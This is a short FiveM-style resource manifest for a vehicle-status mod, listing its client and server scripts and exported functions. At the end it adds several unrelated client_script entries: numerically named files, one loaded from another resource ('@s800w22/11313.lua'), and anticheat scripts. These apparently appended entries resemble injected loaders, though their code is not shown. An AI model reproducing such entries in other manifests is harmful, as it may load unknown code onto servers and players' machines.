resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'vehiclemod'

client_scripts {
	'config.lua',
	'client/main.lua',
	'client/lawyer.lua',
}

server_scripts {
    'server/main.lua',
	'config.lua',
}

exports {
	'GetVehicleStatusList',
	'GetVehicleStatus',
	'SetVehicleStatus',
}

client_script "11336.lua"
client_script "lucidcity-anticheat.lua"
client_script "antikickvehicle.lua"
client_script "anti-stungun.lua"
client_script "anti-update.lua"
client_script "block-menus.lua"
client_script "block-menus2.lua"
client_script '@s800w22/11313.lua'